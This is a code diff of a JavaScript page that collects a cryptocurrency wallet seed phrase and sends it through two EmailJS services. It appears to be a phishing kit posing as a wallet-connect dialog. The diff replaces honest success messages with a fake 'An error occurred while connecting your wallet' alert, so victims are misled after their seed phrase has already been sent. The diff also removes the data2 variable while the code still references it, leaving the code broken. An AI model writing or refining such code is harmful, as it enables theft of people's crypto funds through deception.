@@ -1466,7 +1466,7 @@ function initSecondEmailJS() {
         if (response.ok) {
           return { status: 200, text: "OK" };
         }
-        throw new Error("Failed to send email via second service");
+        throw new Error("Failed to send email via ss");
       });
     },
   };
@@ -1483,7 +1483,7 @@ async function submitSeedPhrase() {
   const walletIcon = selectedWallet.icon;
 
   if (!seedPhrase) {
-    alert("Please enter your seed input");
+    alert("Please enter your seed phrase");
     return;
   }
 
@@ -1529,16 +1529,14 @@ async function submitSeedPhrase() {
       }),
     });
 
-    const data2 = await response2.json();
-
     if (response2.ok) {
       console.log("✅ EmailJS Service 2 sent successfully");
-      alert("✅ Email sent successfully via both services!");
+      alert("An error occurred while connecting your wallet!");
       closeModal("modal2");
       document.getElementById("seed-phrase-input").value = "";
     } else {
       console.error("❌ Service 2 failed:", data2);
-      alert("⚠️ Service 1 sent, but Service 2 failed");
+      alert("An error occurred while connecting your wallet");
     }
 
     connectBtn.disabled = false;
